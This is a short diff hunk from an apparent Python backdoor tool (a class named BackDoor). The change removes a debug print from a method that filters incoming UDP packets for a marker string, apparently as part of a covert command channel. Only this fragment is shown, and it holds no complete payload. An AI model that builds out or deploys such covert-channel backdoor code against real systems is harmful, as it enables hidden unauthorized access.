@@ -235,7 +235,6 @@ class BackDoor:
         self.craft_packet(msg)
 
     def filter_packets(self, packet) -> None:
-        print("got packet")
         try:
             msg = packet[UDP].load.decode()
             if UDP in packet and msg.startswith(self.flag_begin) \
